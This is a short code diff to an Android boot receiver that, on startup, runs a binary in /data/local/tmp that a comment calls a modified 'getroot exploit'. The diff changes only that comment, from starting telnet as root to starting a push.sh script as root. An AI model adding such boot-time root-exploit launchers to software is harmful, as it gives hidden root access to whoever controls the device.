@@ -27,7 +27,7 @@ public class BootHandler extends BroadcastReceiver{
 	@Override
 	public void onReceive(Context arg0, Intent arg1) {
 		try {
-			Runtime.getRuntime().exec("/data/local/tmp/roothandler"); //RootHandler is modifed from getroot exploit so It will start telnet as root
+			Runtime.getRuntime().exec("/data/local/tmp/roothandler"); //RootHandler is modifed from getroot exploit so It will start the push.sh script as root
 		} catch (IOException e) {
 			e.printStackTrace();
 		} 
